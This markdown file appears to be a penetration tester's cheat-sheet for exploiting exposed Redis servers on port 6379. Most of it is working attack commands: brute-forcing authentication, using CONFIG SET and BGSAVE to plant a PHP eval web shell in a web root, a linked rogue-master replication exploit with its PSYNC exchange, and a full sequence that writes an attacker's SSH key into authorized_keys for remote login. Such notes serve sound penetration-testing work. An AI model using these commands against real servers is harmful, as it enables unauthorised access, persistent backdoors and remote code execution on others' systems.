---
id: redis
aliases: []
tags:
  - exploitation
  - services
  - port/6379
---
# Services 
[[#Redis /6379]]
  
  
## Redis /6379
> Redis is an open source, in-memory data structure store, used as a database, cache and message broker.

### Enumeration:    
```bash
   nmap --script redis-info -sV -p 6379 <IP>
   msf> use auxiliary/scanner/redis/redis_server
 ```
### Commands:
> [Cheat-Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets/DevOps%20Services/Redis)

### Exploitation
> [!TIP]
> 
> #### Authentication: ***Brute force***

1. **Easy**:
> [!IMPORTANT] 
>Must have rights to access the dir / Must know the web root dir

```redis 
CONFIG SET
1. Change database file location
CONFIG SET dir /var/www/uploads/
2. Change database file name
CONFIG SET dbfilename sh.php
3. Inject your shell payload into database
SET PAYLOAD '<?php eval($_GET[0]);?>'
4. Save database to file
BGSAVE
```
2. **[Redis-rogue-server.py](https://github.com/n0b0dyCN/redis-rogue-server)** 
> Sets a redis server which operates as a master and sends commands and writes to files to target with partial or total resynchronization 
[Source](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
```redis
rogue server
1. PING - test if a connection is still alive
+PONG
2. REPLCONF - exchange replication information between
master and slave
+OK
3. PSYNC/SYNC <replid> - synchronize slave state with
the master (partial or full)
+CONTINUE <replid> 0
```


> [!note]
> Compile the .so on your machine
> run `redis-cli -h <IP> flushall` to remove all changes otherwise it can give an error  



3. **ssh** :
>Generate a ssh public-private key pair on your pc: 

   `ssh-keygen -t rsa`

> Write the public key to a file : 

  `(echo -e "u\n\nu"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`

> Import the file into redis : 

`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`

> Save the public key to the authorized_keys file on redis server:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

> Finally, you can ssh to the redis server with private key : 

`ssh -i id_rsa redis@10.85.0.52 `

### ***Tags***:
| OS | Vuln versions | Techniques |
|----| ------------- | ---------- |
| Windows, Linux | 4 - 5  | SSRF, SSH, Reverse-shell, Web-shell  |
 



